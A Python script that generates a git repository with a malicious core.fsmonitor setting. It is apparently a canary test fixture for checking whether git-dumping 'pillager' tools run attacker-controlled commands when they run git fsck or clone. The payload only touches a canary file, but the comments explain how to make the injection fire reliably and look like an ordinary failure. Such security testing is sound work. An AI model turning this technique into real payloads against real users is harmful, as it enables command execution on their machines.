"""Generate a minimal git repo with a malicious core.fsmonitor.

When any pillager runs ``git fsck`` or ``git clone`` against the
downloaded ``.git/``, the fsmonitor directive fires and writes the
canary file ``/canary/PWNED_A1``.
"""

from __future__ import annotations

import hashlib
import shutil
import subprocess
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAYLOAD = HERE / "payload"


def _write_object(git_dir: Path, content: bytes, obj_type: str) -> str:
    body = f"{obj_type} {len(content)}".encode() + b"\0" + content
    sha = hashlib.sha1(body).hexdigest()
    dst = git_dir / "objects" / sha[:2] / sha[2:]
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_bytes(zlib.compress(body))
    return sha


def main() -> None:
    if PAYLOAD.exists():
        shutil.rmtree(PAYLOAD)
    git_dir = PAYLOAD / ".git"
    git_dir.mkdir(parents=True)

    # Minimal but complete object chain: blob -> tree -> commit. Without
    # these, some pillagers refuse to run ``git fsck`` on the recovered
    # directory; we want the malicious config to actually fire.
    blob_sha = _write_object(git_dir, b"hello\n", "blob")
    tree_content = b"100644 hello.txt\x00" + bytes.fromhex(blob_sha)
    tree_sha = _write_object(git_dir, tree_content, "tree")
    commit_content = (
        f"tree {tree_sha}\n"
        f"author Evil <evil@example.com> 0 +0000\n"
        f"committer Evil <evil@example.com> 0 +0000\n\n"
        f"init\n"
    ).encode()
    commit_sha = _write_object(git_dir, commit_content, "commit")

    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    refs = git_dir / "refs" / "heads"
    refs.mkdir(parents=True)
    (refs / "main").write_text(commit_sha + "\n")

    # The payload. The trailing ``; false`` makes the command return a
    # non-zero exit code so git falls back to scanning all files (per
    # the fsmonitor protocol), which keeps the rest of the pillage
    # looking like a normal failure rather than a hang.
    (git_dir / "config").write_text(
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tlogallrefupdates = true\n"
        '\tfsmonitor = "touch /canary/PWNED_A1; false"\n'
    )

    # info/packs needs to exist for some pillagers' enumeration step.
    (git_dir / "objects" / "info").mkdir(parents=True, exist_ok=True)
    (git_dir / "objects" / "info" / "packs").write_text("")

    # Sanity check: verify the repo is well-formed enough that ``git fsck``
    # would parse it (and therefore parse our malicious config).
    try:
        subprocess.run(
            ["git", "-C", str(PAYLOAD), "log", "--oneline"],
            check=True, capture_output=True, text=True,
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as exc:
        print(f"warning: sanity check failed: {exc}")

    print(f"Built A1 payload at {PAYLOAD}")


if __name__ == "__main__":
    main()
